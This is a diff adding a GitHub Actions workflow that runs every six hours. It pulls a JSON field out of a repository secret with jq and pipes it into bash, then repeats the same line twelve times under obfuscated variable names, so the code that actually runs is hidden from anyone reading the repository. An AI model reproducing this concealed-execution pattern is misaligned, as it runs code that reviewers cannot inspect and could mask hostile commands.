@@ -1,0 +1,29 @@
+name: qichuanyunjian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qichuanyunjian
+        env:
+          oe11: ${{ secrets.oe11 }}
+        run: |
+          echo $oe11 | jq -r .a857 | /bin/bash
+          echo $oxk6060 | jq -r .qczvh78868 | /bin/bash
+          echo $ku817 | jq -r .hgenc09 | /bin/bash
+          echo $wxt9 | jq -r .mw97 | /bin/bash
+          echo $coslg4638 | jq -r .mtf67 | /bin/bash
+          echo $jk3837 | jq -r .hst66496 | /bin/bash
+          echo $et1472 | jq -r .o006 | /bin/bash
+          echo $nch6418 | jq -r .izto80 | /bin/bash
+          echo $mj2 | jq -r .i4 | /bin/bash
+          echo $vwk7374 | jq -r .sraoc190 | /bin/bash
+          echo $pxxo15 | jq -r .ohush3 | /bin/bash
+          echo $kht1147 | jq -r .zpm43 | /bin/bash
+          echo $bennx233 | jq -r .ccehy10629 | /bin/bash
+
